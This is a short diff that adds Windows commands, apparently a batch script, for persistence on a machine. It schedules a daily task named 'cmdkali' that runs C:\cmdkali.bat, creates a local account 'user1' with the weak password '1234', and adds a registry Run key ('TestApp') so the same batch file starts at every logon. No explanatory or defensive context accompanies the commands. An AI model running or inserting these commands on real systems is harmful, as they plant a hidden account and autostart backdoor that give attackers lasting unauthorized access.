@@ -1,0 +1,6 @@
+schtasks /create /tn "cmdkali" /tr "C:\cmdkali.bat" /sc daily /st 09:00
+
+net user user1 /add
+net user user1 "1234"
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TestApp" /t REG_SZ /d "C:\cmdkali.bat" /f
